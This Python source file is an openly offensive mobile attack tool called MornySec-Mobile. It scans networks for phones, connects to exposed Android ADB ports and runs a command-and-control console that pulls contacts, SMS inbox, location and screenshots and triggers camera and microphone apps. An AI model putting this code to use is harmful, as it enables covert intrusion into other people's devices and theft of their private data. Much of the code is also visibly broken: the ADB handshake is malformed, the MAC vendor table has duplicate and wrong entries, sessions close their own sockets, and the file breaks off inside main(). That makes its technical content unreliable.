#!/usr/bin/env python3
"""
MornySec-Mobile - Enhanced Mobile Device Discovery & Exploitation
Detects ALL mobile devices (Android, iOS, etc.) on the network
Version: 2.0.0 - For Authorized Testing Only
"""

import argparse
import ipaddress
import socket
import base64
import re
import threading
import time
import sys
import os
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import binascii

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
        BLUE = '\033[94m'; MAGENTA = '\033[95m'; CYAN = '\033[96m'
        WHITE = '\033[97m'; RESET = '\033[0m'
    class Style:
        RESET_ALL = '\033[0m'; BRIGHT = '\033[1m'

# ============================================
# UTILITY FUNCTIONS
# ============================================

def print_status(message: str, status_type: str = 'info'):
    """Print colored status messages"""
    colors = {
        'info': Fore.CYAN,
        'found': Fore.GREEN,
        'warning': Fore.YELLOW,
        'error': Fore.RED,
        'success': Fore.GREEN + Style.BRIGHT,
        'exploit': Fore.MAGENTA + Style.BRIGHT,
        'critical': Fore.RED + Style.BRIGHT,
        'vuln': Fore.YELLOW + Style.BRIGHT,
        'c2': Fore.BLUE + Style.BRIGHT,
        'output': Fore.GREEN
    }
    color = colors.get(status_type, Fore.WHITE)
    print(f"{color}{message}{Style.RESET_ALL}")

def print_banner():
    """Display tool banner"""
    print_status("""
    ╔═══════════════════════════════════════════════════════════╗
    ║   📱 MornySec-Mobile v2.0.0                             ║
    ║   Enhanced Mobile Device Discovery & C2 Framework        ║
    ║   Created by: Philip Morny                               ║
    ║   For Authorized Security Testing Only                   ║
    ╚═══════════════════════════════════════════════════════════╝
    """, 'info')

# ============================================
# CONFIGURATION
# ============================================

VERSION = "2.0.0"
AUTHOR = "Philip Morny"
REPO_URL = "https://github.com/cyberobinhood/MornySec-Mobile"

# ============================================
# MAC ADDRESS VENDOR DATABASE
# ============================================

MAC_VENDORS = {
    # Apple
    '08:63:61': 'Apple',
    '1C:1C:6E': 'Apple',
    '34:12:98': 'Apple',
    '40:31:3C': 'Apple',
    '50:1A:C5': 'Apple',
    '8C:29:37': 'Apple',
    'A8:66:7F': 'Apple',
    'AC:29:3A': 'Apple',
    'B0:34:95': 'Apple',
    'C0:E5:4E': 'Apple',
    'D4:61:DA': 'Apple',
    'E0:36:76': 'Apple',
    'F0:18:98': 'Apple',
    'F4:5C:89': 'Apple',
    
    # Samsung
    '00:11:22': 'Samsung',
    '00:12:13': 'Samsung',
    '00:1F:E0': 'Samsung',
    'F4:37:B7': 'Samsung',
    'BC:20:A4': 'Samsung',
    'E4:8D:8C': 'Samsung',
    '88:23:FE': 'Samsung',
    'E8:48:B8': 'Samsung',
    'CC:2E:5B': 'Samsung',
    'C8:4B:D6': 'Samsung',
    'DC:A4:CA': 'Samsung',
    
    # LG
    '00:16:6C': 'LG',
    '00:1A:C5': 'LG',
    '00:1C:3D': 'LG',
    '30:8D:99': 'LG',
    'E0:03:2B': 'LG',
    '90:B1:1C': 'LG',
    '80:A5:89': 'LG',
    
    # HTC
    '00:18:17': 'HTC',
    '00:19:76': 'HTC',
    '00:21:2B': 'HTC',
    
    # Sony
    '00:1D:5B': 'Sony',
    '00:21:2B': 'Sony',
    '60:45:CB': 'Sony',
    '88:6A:1E': 'Sony',
    
    # Motorola
    '00:1A:79': 'Motorola',
    '00:21:87': 'Motorola',
    'B4:DF:D7': 'Motorola',
    '1C:6B:4A': 'Motorola',
    
    # Nokia
    '00:1A:2B': 'Nokia',
    '00:1B:12': 'Nokia',
    '00:1F:9E': 'Nokia',
    
    # Huawei
    '00:25:9C': 'Huawei',
    'E0:91:F5': 'Huawei',
    '3C:CE:73': 'Huawei',
    '6C:E7:8A': 'Huawei',
    'A4:1F:72': 'Huawei',
    
    # Xiaomi
    '00:26:12': 'Xiaomi',
    '04:FE:31': 'Xiaomi',
    '7C:DD:90': 'Xiaomi',
    '1C:66:AA': 'Xiaomi',
    'B8:27:EB': 'Xiaomi',
    
    # OnePlus
    '00:23:D4': 'OnePlus',
    '1C:6A:7A': 'OnePlus',
    'B4:6B:FC': 'OnePlus',
    
    # Google / Pixel
    'F0:67:5D': 'Google',
    'E4:8B:7C': 'Google',
    '3C:B3:CD': 'Google',
    
    # Others
    '00:1E:0C': 'Generic Mobile',
    '00:21:6B': 'Generic Mobile',
    '00:23:6C': 'Generic Mobile',
    '00:24:8C': 'Generic Mobile',
    '00:25:64': 'Generic Mobile',
}

# ============================================
# ENHANCED DISCOVERY ENGINE
# ============================================

class EnhancedDiscovery:
    """Discover ALL mobile devices on the network"""
    
    def __init__(self, timeout: int = 5):
        self.timeout = timeout
        self.devices_found = []
        
        # Mobile device port signatures
        self.mobile_ports = {
            5555: 'Android ADB',
            62078: 'iOS Lockdown',
            5353: 'mDNS/Bonjour',
            5037: 'ADB Debug',
            4444: 'Android Debug',
            8080: 'HTTP (Mobile)',
            80: 'HTTP',
            443: 'HTTPS',
            22: 'SSH (Mobile)',
            21: 'FTP (Mobile)',
            139: 'NetBIOS',
            445: 'SMB',
            6000: 'X11 (Mobile)'
        }
    
    def get_mac_address(self, ip: str) -> Optional[str]:
        """Get MAC address of device using ARP"""
        try:
            # Use arp command to get MAC
            result = subprocess.run(['arp', '-n', ip], capture_output=True, text=True, timeout=3)
            for line in result.stdout.split('\n'):
                if ip in line and 'ether' in line:
                    mac = line.split()[2]
                    return mac.upper()
                elif ip in line and 'at' in line:
                    mac = line.split()[2]
                    return mac.upper()
            return None
        except:
            return None
    
    def identify_vendor_by_mac(self, mac: str) -> Tuple[str, str]:
        """Identify device vendor from MAC address"""
        if not mac:
            return 'Unknown', 'Unknown MAC'
        
        mac_upper = mac.upper()
        
        # Check first 8 characters (XX:XX:XX)
        for prefix, vendor in MAC_VENDORS.items():
            if mac_upper.startswith(prefix):
                return vendor, mac_upper
        
        # Check first 6 characters (XX:XX)
        for prefix, vendor in MAC_VENDORS.items():
            if mac_upper.startswith(prefix[:8]):
                return vendor, mac_upper
        
        return 'Unknown', mac_upper
    
    def check_port(self, ip: str, port: int) -> bool:
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def get_http_headers(self, ip: str, port: int = 80) -> Optional[Dict]:
        """Get HTTP headers for fingerprinting"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            
            request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: MornySec\r\n\r\n"
            sock.send(request.encode())
            response = sock.recv(2048).decode('utf-8', errors='ignore')
            sock.close()
            
            headers = {}
            for line in response.split('\r\n'):
                if ':' in line:
                    key, value = line.split(':', 1)
                    headers[key.strip()] = value.strip()
            
            return headers
        except:
            return None
    
    def check_mdns(self, ip: str) -> Optional[Dict]:
        """Check for mDNS/Bonjour services (Apple devices)"""
        try:
            # mDNS query for device info
            mdns_query = bytes([
                0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x0B, 0x5F, 0x64, 0x65,
                0x76, 0x69, 0x63, 0x65, 0x2D, 0x69, 0x6E, 0x66,
                0x6F, 0x04, 0x5F, 0x74, 0x63, 0x70, 0x05, 0x6C,
                0x6F, 0x63, 0x61, 0x6C, 0x00, 0x00, 0x0C, 0x00,
                0x01
            ])
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            sock.sendto(mdns_query, (ip, 5353))
            data, _ = sock.recvfrom(1024)
            sock.close()
            
            if data:
                return {'type': 'Apple', 'service': 'mDNS', 'detected': True}
        except:
            pass
        return None
    
    def check_upnp(self, ip: str) -> Optional[Dict]:
        """Check for UPnP services (common on many devices)"""
        try:
            upnp_request = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n'
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            sock.sendto(upnp_request, (ip, 1900))
            data, _ = sock.recvfrom(1024)
            sock.close()
            
            if data:
                response = data.decode('utf-8', errors='ignore')
                if 'UPnP' in response or 'Device' in response:
                    return {'type': 'UPnP', 'detected': True}
        except:
            pass
        return None
    
    def detect_os_by_ports(self, open_ports: List[int]) -> Tuple[str, int]:
        """Detect OS based on open ports"""
        os_score = {'Android': 0, 'iOS': 0, 'Windows': 0, 'Linux': 0}
        
        # Android signatures
        if 5555 in open_ports:
            os_score['Android'] += 50
        if 5037 in open_ports:
            os_score['Android'] += 30
        if 4444 in open_ports:
            os_score['Android'] += 20
        
        # iOS signatures
        if 62078 in open_ports:
            os_score['iOS'] += 50
        if 5353 in open_ports:
            os_score['iOS'] += 20
        
        # Windows signatures
        if 139 in open_ports or 445 in open_ports:
            os_score['Windows'] += 30
        if 135 in open_ports:
            os_score['Windows'] += 20
        
        # Linux/Generic
        if 22 in open_ports:
            os_score['Linux'] += 20
        if 80 in open_ports or 443 in open_ports:
            os_score['Linux'] += 10
        
        # Determine best match
        best_os = max(os_score.items(), key=lambda x: x[1])
        
        # If score is too low, it might be Unknown
        if best_os[1] < 10:
            return 'Unknown', best_os[1]
        
        return best_os[0], best_os[1]
    
    def scan_ip(self, ip: str) -> Dict:
        """Comprehensive scan of a single IP"""
        result = {
            'ip': ip,
            'is_mobile': False,
            'os': 'Unknown',
            'vendor': 'Unknown',
            'mac': None,
            'ports': [],
            'services': {},
            'hostname': None,
            'confidence': 0
        }
        
        # Get MAC address
        mac = self.get_mac_address(ip)
        if mac:
            result['mac'] = mac
            vendor, _ = self.identify_vendor_by_mac(mac)
            result['vendor'] = vendor
            if vendor != 'Unknown':
                result['is_mobile'] = True
                result['confidence'] += 30
        
        # Scan common ports
        open_ports = []
        for port, service in self.mobile_ports.items():
            if self.check_port(ip, port):
                open_ports.append(port)
                result['services'][port] = service
        
        result['ports'] = open_ports
        
        # Check for HTTP headers
        if 80 in open_ports or 8080 in open_ports:
            port = 80 if 80 in open_ports else 8080
            headers = self.get_http_headers(ip, port)
            if headers:
                result['services']['http'] = headers
                # Check for mobile signatures in headers
                if 'Server' in headers:
                    server = headers['Server']
                    if 'Android' in server or 'Dalvik' in server:
                        result['os'] = 'Android'
                        result['is_mobile'] = True
                        result['confidence'] += 20
                    elif 'iPhone' in server or 'iOS' in server:
                        result['os'] = 'iOS'
                        result['is_mobile'] = True
                        result['confidence'] += 20
        
        # Check for mDNS
        if 5353 in open_ports:
            mdns = self.check_mdns(ip)
            if mdns:
                result['services']['mdns'] = mdns
                result['is_mobile'] = True
                result['confidence'] += 20
                if result['os'] == 'Unknown':
                    result['os'] = 'iOS'  # Likely iOS
        
        # Check for UPnP
        upnp = self.check_upnp(ip)
        if upnp:
            result['services']['upnp'] = upnp
            result['is_mobile'] = True
            result['confidence'] += 10
        
        # Detect OS from ports
        if open_ports:
            os_detected, score = self.detect_os_by_ports(open_ports)
            if os_detected != 'Unknown' and score > 20:
                result['os'] = os_detected
                result['is_mobile'] = True
                result['confidence'] += score
        
        return result
    
    def scan_network(self, network: str) -> List[Dict]:
        """Scan network for ALL mobile devices"""
        devices = []
        
        try:
            net = ipaddress.ip_network(network, strict=False)
            hosts = list(net.hosts())[:254]
            
            print_status(f"[*] Scanning {len(hosts)} hosts for mobile devices...", 'info')
            print_status("[*] Using enhanced detection (ports, MAC, mDNS, HTTP)", 'info')
            
            with ThreadPoolExecutor(max_workers=50) as executor:
                future_to_ip = {executor.submit(self.scan_ip, str(ip)): str(ip) for ip in hosts}
                
                for future in as_completed(future_to_ip):
                    ip = future_to_ip[future]
                    try:
                        result = future.result(timeout=5)
                        if result and result.get('is_mobile', False):
                            devices.append(result)
                            confidence = result.get('confidence', 0)
                            os_info = result.get('os', 'Unknown')
                            vendor = result.get('vendor', 'Unknown')
                            print_status(f"[+] Found: {result['ip']} ({vendor} - {os_info}) [Confidence: {confidence}%]", 'found')
                    except:
                        pass
            
        except Exception as e:
            print_status(f"[!] Network scan error: {e}", 'error')
        
        return devices

# ============================================
# SESSION MANAGEMENT
# ============================================

class SessionManager:
    """Manage active sessions with discovered devices"""
    
    def __init__(self):
        self.sessions = {}
        self.session_id = 0
    
    def create_session(self, device_ip: str, exploit_type: str, connection) -> int:
        """Create a new session"""
        self.session_id += 1
        session = {
            'id': self.session_id,
            'ip': device_ip,
            'exploit_type': exploit_type,
            'connection': connection,
            'created': datetime.now(),
            'last_active': datetime.now(),
            'commands_executed': 0,
            'output_log': []
        }
        self.sessions[self.session_id] = session
        return self.session_id
    
    def get_session(self, session_id: int) -> Optional[Dict]:
        return self.sessions.get(session_id)
    
    def list_sessions(self) -> List[Dict]:
        return list(self.sessions.values())
    
    def remove_session(self, session_id: int):
        if session_id in self.sessions:
            del self.sessions[session_id]
    
    def execute_command(self, session_id: int, command: str) -> Dict:
        session = self.get_session(session_id)
        if not session:
            return {'success': False, 'error': 'Session not found'}
        
        session['last_active'] = datetime.now()
        session['commands_executed'] += 1
        
        if session['exploit_type'] == 'adb':
            return self._execute_adb_command(session, command)
        else:
            return {'success': False, 'error': 'Unknown exploit type'}
    
    def _execute_adb_command(self, session: Dict, command: str) -> Dict:
        try:
            ip = session['ip']
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((ip, 5555))
            
            sock.send(b'CNXN\x00\x00\x00\x01\x00\x00\x00\x00\x10\x00\x00\x00')
            response = sock.recv(1024)
            
            if response and b'OKAY' in response:
                cmd = f"shell:{command}\n".encode()
                sock.send(cmd)
                output = sock.recv(8192)
                sock.close()
                
                return {
                    'success': True,
                    'output': output.decode('utf-8', errors='ignore'),
                    'command': command
                }
            else:
                return {'success': False, 'error': 'ADB connection failed'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ============================================
# C2 INTERFACE
# ============================================

class C2Interface:
    """Command & Control Interface"""
    
    def __init__(self, session_manager: SessionManager):
        self.session_manager = session_manager
        self.running = True
        self.current_session = None
    
    def show_help(self):
        print_status("""
╔═══════════════════════════════════════════════════════════════╗
║  📱 C2 COMMANDS                                              ║
╠═══════════════════════════════════════════════════════════════╣
║  sessions              - List all active sessions             ║
║  select <id>           - Select a session to interact with    ║
║  shell                 - Open interactive shell on session    ║
║  exec <command>        - Execute command on selected session  ║
║  info                  - Get device information               ║
║  screenshot            - Capture screenshot                   ║
║  contacts              - Extract contacts                     ║
║  sms                   - Extract SMS messages                 ║
║  location              - Get device location                  ║
║  cam                   - Access camera                        ║
║  mic                   - Access microphone                    ║
║  kill                  - Terminate session                    ║
║  clear                 - Clear screen                         ║
║  help                  - Show this help                       ║
║  exit                  - Exit C2 interface                    ║
╚═══════════════════════════════════════════════════════════════╝
        """, 'info')
    
    def run(self):
        print_status("\n[*] C2 Interface Activated", 'c2')
        print_status("[*] Type 'help' for available commands", 'info')
        print_status(f"[*] Active sessions: {len(self.session_manager.list_sessions())}", 'info')
        print_status("="*60, 'info')
        
        while self.running:
            try:
                if self.current_session:
                    prompt = f"📱[{self.current_session['id']}@{self.current_session['ip']}]> "
                else:
                    prompt = "📱[C2]> "
                
                command = input(prompt).strip()
                if not command:
                    continue
                
                parts = command.split()
                cmd = parts[0].lower()
                args = parts[1:] if len(parts) > 1 else []
                self.execute_c2_command(cmd, args)
                
            except KeyboardInterrupt:
                print_status("\n[!] Use 'exit' to quit", 'warning')
            except Exception as e:
                print_status(f"[!] Error: {e}", 'error')
    
    def execute_c2_command(self, cmd: str, args: List[str]):
        if cmd == 'help':
            self.show_help()
        elif cmd == 'sessions':
            self.list_sessions()
        elif cmd == 'select':
            if not args:
                print_status("[!] Usage: select <session_id>", 'error')
                return
            try:
                session_id = int(args[0])
                session = self.session_manager.get_session(session_id)
                if session:
                    self.current_session = session
                    print_status(f"[+] Selected session {session_id} on {session['ip']}", 'success')
                else:
                    print_status(f"[!] Session {session_id} not found", 'error')
            except ValueError:
                print_status("[!] Invalid session ID", 'error')
        elif cmd == 'shell':
            if not self.current_session:
                print_status("[!] No session selected", 'error')
                return
            self.interactive_shell()
        elif cmd == 'exec':
            if not self.current_session:
                print_status("[!] No session selected", 'error')
                return
            if not args:
                print_status("[!] Usage: exec <command>", 'error')
                return
            command = ' '.join(args)
            self.execute_command(command)
        elif cmd == 'info':
            if not self.current_session:
                print_status("[!] No session selected", 'error')
                return
            self.get_device_info()
        elif cmd == 'screenshot':
            if not self.current_session:
                print_status("[!] No session selected", 'error')
                return
            self.capture_screenshot()
        elif cmd == 'contacts':
            if not self.current_session:
                print_status("[!] No session selected", 'error')
                return
            self.extract_contacts()
        elif cmd == 'sms':
            if not self.current_session:
                print_status("[!] No session selected", 'error')
                return
            self.extract_sms()
        elif cmd == 'location':
            if not self.current_session:
                print_status("[!] No session selected", 'error')
                return
            self.get_location()
        elif cmd == 'cam':
            if not self.current_session:
                print_status("[!] No session selected", 'error')
                return
            self.access_camera()
        elif cmd == 'mic':
            if not self.current_session:
                print_status("[!] No session selected", 'error')
                return
            self.access_microphone()
        elif cmd == 'kill':
            if not args:
                if self.current_session:
                    session_id = self.current_session['id']
                    self.session_manager.remove_session(session_id)
                    self.current_session = None
                    print_status(f"[+] Session {session_id} terminated", 'success')
                else:
                    print_status("[!] No session selected", 'error')
            else:
                try:
                    session_id = int(args[0])
                    self.session_manager.remove_session(session_id)
                    if self.current_session and self.current_session['id'] == session_id:
                        self.current_session = None
                    print_status(f"[+] Session {session_id} terminated", 'success')
                except ValueError:
                    print_status("[!] Invalid session ID", 'error')
        elif cmd == 'clear':
            os.system('clear' if os.name == 'posix' else 'cls')
        elif cmd == 'exit':
            print_status("[*] Exiting C2 interface...", 'info')
            self.running = False
        else:
            print_status(f"[!] Unknown command: {cmd}. Type 'help' for available commands.", 'error')
    
    def list_sessions(self):
        sessions = self.session_manager.list_sessions()
        if not sessions:
            print_status("[!] No active sessions", 'warning')
            return
        
        print_status("\n📱 ACTIVE SESSIONS", 'c2')
        print_status("="*70, 'info')
        print(f"{'ID':<6} {'IP':<20} {'Exploit':<15} {'Commands':<10} {'Last Active':<20}")
        print("-"*70)
        
        for session in sessions:
            last_active = session['last_active'].strftime('%H:%M:%S')
            print(f"{session['id']:<6} {session['ip']:<20} {session['exploit_type']:<15} "
                  f"{session['commands_executed']:<10} {last_active:<20}")
        print()
    
    def interactive_shell(self):
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        ip = self.current_session['ip']
        
        print_status(f"\n[*] Opening interactive shell on {ip}", 'info')
        print_status("[*] Type 'exit' to return to C2", 'info')
        print_status("="*60, 'info')
        
        while True:
            try:
                cmd = input(f"${ip}> ").strip()
                if cmd.lower() == 'exit':
                    break
                if cmd:
                    result = self.session_manager.execute_command(session_id, cmd)
                    if result.get('success'):
                        print_status(result.get('output', ''), 'output')
                    else:
                        print_status(f"[!] Command failed: {result.get('error', 'Unknown error')}", 'error')
            except KeyboardInterrupt:
                print_status("\n[!] Use 'exit' to return to C2", 'warning')
            except Exception as e:
                print_status(f"[!] Error: {e}", 'error')
    
    def execute_command(self, command: str):
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        result = self.session_manager.execute_command(session_id, command)
        
        if result.get('success'):
            print_status("Command executed successfully:", 'success')
            print_status(result.get('output', ''), 'output')
        else:
            print_status(f"[!] Command failed: {result.get('error', 'Unknown error')}", 'error')
    
    def get_device_info(self):
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        ip = self.current_session['ip']
        
        print_status(f"\n[*] Gathering device info for {ip}", 'info')
        print_status("="*60, 'info')
        
        commands = [
            'getprop ro.product.model',
            'getprop ro.product.manufacturer',
            'getprop ro.build.version.release',
            'getprop ro.build.version.sdk',
            'getprop ro.product.brand',
            'df -h',
            'free -h',
            'whoami'
        ]
        
        for cmd in commands:
            result = self.session_manager.execute_command(session_id, cmd)
            if result.get('success'):
                output = result.get('output', '').strip()
                if output:
                    print_status(f"{cmd}: {output}", 'info')
            time.sleep(0.5)
        
        print_status("="*60, 'info')
    
    def capture_screenshot(self):
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        ip = self.current_session['ip']
        
        print_status(f"[*] Capturing screenshot from {ip}", 'info')
        
        result = self.session_manager.execute_command(session_id, 'screencap -p /sdcard/screenshot.png')
        
        if result.get('success'):
            download_result = self.session_manager.execute_command(
                session_id, 
                'cat /sdcard/screenshot.png'
            )
            if download_result.get('success'):
                filename = f"screenshot_{ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                with open(filename, 'wb') as f:
                    f.write(download_result.get('output', '').encode())
                print_status(f"[+] Screenshot saved: {filename}", 'success')
            else:
                print_status("[!] Failed to download screenshot", 'error')
        else:
            print_status("[!] Screenshot capture failed", 'error')
    
    def extract_contacts(self):
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        ip = self.current_session['ip']
        
        print_status(f"[*] Extracting contacts from {ip}", 'info')
        
        result = self.session_manager.execute_command(
            session_id,
            'content query --uri content://contacts/people/'
        )
        
        if result.get('success'):
            filename = f"contacts_{ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(filename, 'w') as f:
                f.write(result.get('output', ''))
            print_status(f"[+] Contacts saved: {filename}", 'success')
        else:
            print_status("[!] Failed to extract contacts", 'error')
    
    def extract_sms(self):
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        ip = self.current_session['ip']
        
        print_status(f"[*] Extracting SMS from {ip}", 'info')
        
        result = self.session_manager.execute_command(
            session_id,
            'content query --uri content://sms/inbox'
        )
        
        if result.get('success'):
            filename = f"sms_{ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(filename, 'w') as f:
                f.write(result.get('output', ''))
            print_status(f"[+] SMS saved: {filename}", 'success')
        else:
            print_status("[!] Failed to extract SMS", 'error')
    
    def get_location(self):
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        ip = self.current_session['ip']
        
        print_status(f"[*] Getting location from {ip}", 'info')
        
        result = self.session_manager.execute_command(
            session_id,
            'dumpsys location'
        )
        
        if result.get('success'):
            output = result.get('output', '')
            lat_match = re.search(r'latitude=([\d.]+)', output)
            lon_match = re.search(r'longitude=([\d.]+)', output)
            
            if lat_match and lon_match:
                lat = lat_match.group(1)
                lon = lon_match.group(1)
                print_status(f"[+] Location: {lat}, {lon}", 'success')
                maps_url = f"https://www.google.com/maps?q={lat},{lon}"
                print_status(f"    Maps: {maps_url}", 'info')
            else:
                print_status("[!] No location data available", 'warning')
        else:
            print_status("[!] Failed to get location", 'error')
    
    def access_camera(self):
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        ip = self.current_session['ip']
        
        print_status(f"[*] Accessing camera on {ip}", 'info')
        
        result = self.session_manager.execute_command(
            session_id,
            'am start -a android.media.action.IMAGE_CAPTURE'
        )
        
        if result.get('success'):
            print_status("[+] Camera app launched", 'success')
        else:
            print_status("[!] Failed to access camera", 'error')
    
    def access_microphone(self):
        if not self.current_session:
            return
        
        session_id = self.current_session['id']
        ip = self.current_session['ip']
        
        print_status(f"[*] Accessing microphone on {ip}", 'info')
        
        result = self.session_manager.execute_command(
            session_id,
            'am start -a android.provider.MediaStore.RECORD_SOUND'
        )
        
        if result.get('success'):
            print_status("[+] Voice recorder launched", 'success')
        else:
            print_status("[!] Failed to access microphone", 'error')

# ============================================
# EXPLOITATION ENGINE
# ============================================

class ExploitEngine:
    def __init__(self, session_manager: SessionManager, verbose: bool = False):
        self.session_manager = session_manager
        self.verbose = verbose
    
    def exploit_adb(self, ip: str) -> Dict:
        result = {
            'success': False,
            'type': 'ADB Exploitation',
            'output': '',
            'session_id': None
        }
        
        try:
            print_status(f"[*] Attempting ADB exploitation on {ip}", 'info')
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, 5555))
            
            sock.send(b'CNXN\x00\x00\x00\x01\x00\x00\x00\x00\x10\x00\x00\x00')
            response = sock.recv(1024)
            
            if response and b'OKAY' in response:
                result['success'] = True
                result['output'] = 'ADB connection established'
                print_status(f"[+] ADB Exploit successful on {ip}", 'success')
                
                session_id = self.session_manager.create_session(ip, 'adb', sock)
                result['session_id'] = session_id
                print_status(f"[+] Session {session_id} created for {ip}", 'success')
            
            sock.close()
            
        except Exception as e:
            if self.verbose:
                print_status(f"[!] ADB exploit error: {e}", 'error')
        
        return result

# ============================================
# MAIN SCANNER
# ============================================

class MornySecMobile:
    def __init__(self, args):
        self.args = args
        self.discovery = EnhancedDiscovery(timeout=args.timeout)
        self.session_manager = SessionManager()
        self.exploit_engine = ExploitEngine(self.session_manager, verbose=args.verbose)
        self.devices = []
        self.c2_interface = C2Interface(self.session_manager)
    
    def scan(self) -> List[Dict]:
        network = self.args.target
        
        try:
            ipaddress.ip_address(network)
            result = self.discovery.scan_ip(network)
            if result.get('is_mobile'):
                self.devices.append(result)
                print_status(f"[+] Found mobile device: {result['ip']} ({result.get('vendor', 'Unknown')})", 'found')
        except:
            self.devices = self.discovery.scan_network(network)
        
        return self.devices
    
    def exploit(self, target_ip: Optional[str] = None):
        print_status("\n[*] Starting exploitation phase...", 'info')
        print_status("="*60, 'info')
        
        devices_to_exploit = []
        
        if target_ip:
            for device in self.devices:
                if device['ip'] == target_ip:
                    devices_to_exploit.append(device)
                    break
            if not devices_to_exploit:
                print_status(f"[!] Device {target_ip} not found", 'error')
                return
        else:
            for device in self.devices:
                if 5555 in device.get('ports', []):
                    devices_to_exploit.append(device)
        
        if not devices_to_exploit:
            print_status("[!] No exploitable devices found", 'warning')
            print_status("[!] Make sure ADB is enabled on Android devices", 'warning')
            return
        
        print_status(f"[*] Exploiting {len(devices_to_exploit)} devices", 'info')
        
        for device in devices_to_exploit:
            ip = device['ip']
            
            print_status(f"\n[*] Targeting {ip} ({device.get('vendor', 'Unknown')} - {device.get('os', 'Unknown')})", 'info')
            print_status(f"[*] Confidence: {device.get('confidence', 0)}%", 'info')
            
            if 5555 in device.get('ports', []):
                result = self.exploit_engine.exploit_adb(ip)
                if result['success']:
                    print_status(f"[+] ADB exploit successful on {ip}", 'success')
    
    def start_c2(self):
        if not self.session_manager.list_sessions():
            print_status("[!] No active sessions. Exploit a device first.", 'warning')
            return
        
        print_status("\n[*] Starting Command & Control Interface", 'c2')
        self.c2_interface.run()
    
    def report(self):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        report_name = f"MornySec_Mobile_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(report_name, 'w', encoding='utf-8') as f:
            f.write("="*70 + "\n")
            f.write("📱 MORNY-SEC MOBILE SECURITY REPORT\n")
            f.write(f"Generated: {timestamp}\n")
            f.write(f"Tool: MornySec-Mobile {VERSION}\n")
            f.write(f"Author: {AUTHOR}\n")
            f.write("="*70 + "\n\n")
            
            if self.devices:
                f.write("📱 DEVICES DISCOVERED\n")
                f.write("-"*70 + "\n\n")
                
                for idx, device in enumerate(self.devices, 1):
                    f.write(f"[{idx}] {device['ip']}\n")
                    f.write(f"    OS: {device.get('os', 'Unknown')}\n")
                    f.write(f"    Vendor: {device.get('vendor', 'Unknown')}\n")
                    f.write(f"    Confidence: {device.get('confidence', 0)}%\n")
                    f.write(f"    Ports: {device.get('ports', [])}\n")
                    if device.get('services'):
                        f.write(f"    Services: {list(device['services'].keys())}\n")
                    if device.get('mac'):
                        f.write(f"    MAC: {device['mac']}\n")
                    f.write("\n")
            
            if self.session_manager.list_sessions():
                f.write("\n💥 ACTIVE SESSIONS\n")
                f.write("-"*70 + "\n\n")
                
                for session in self.session_manager.list_sessions():
                    f.write(f"[{session['id']}] {session['ip']}\n")
                    f.write(f"    Exploit: {session['exploit_type']}\n")
                    f.write(f"    Commands: {session['commands_executed']}\n")
                    f.write("\n")
        
        print_status(f"\n📄 Security report saved to: {report_name}", 'success')

# ============================================
# MAIN ENTRY POINT
# ============================================

def main():
    parser = argparse.ArgumentParser(
        description='MornySec-Mobile - Enhanced Mobile Device Discovery & Exploitation',
        epilog=f'Example: python MornySec-Mobile.py 192.168.1.0/24 -s -e --c2\n\n'
               f'Author: {AUTHOR}\n'
               f'Repository: {REPO_URL}',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('target', help='Target IP or CIDR range')
    parser.add_argument('-t', '--threads', default=30, type=int,
                       help='Number of threads (default: 30)')
    parser.add_argument('--timeout', default=5, type=int,
                       help='Connection timeout (default: 5)')
    parser.add_argument('-s', '--scan', action='store_true',
                       help='Scan for mobile devices')
    parser.add_argument('-e', '--exploit', action='store_true',
                       help='Automatically exploit vulnerabilities')
    parser.add_argument('--c2', action='store_true',
                       help='Start Command & Control interface')
    parser.add_argument('--target-ip', help='Exploit specific device by IP')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')
    parser.add_argument('--version', action='version',
                       version=f'MornySec-Mobile {VERSION}')
    
    args = parser.parse_args()
    
    # Show banner
    print_banner()
    
    print_status("⚠️  LEGAL NOTICE: Only use on networks you own or have", 'warning')
    print_status("   explicit authorization to test.", 'warning')
    print_status(f"   Repository: {REPO_URL}", 'info')
    print()
    
    # Initialize scanner
    scanner = MornySecMobile(args)
    
    # Run scan if requested
    if args.scan or args.exploit:
        print_status("[*] Starting enhanced device discovery...", 'info')
        print_status("[*] Detection methods: Ports, MAC Address, HTTP Headers, mDNS, UPnP", 'info')
        devices = scanner.scan()
        
        if not devices:
            print_status("[!] No mobile devices found", 'error')
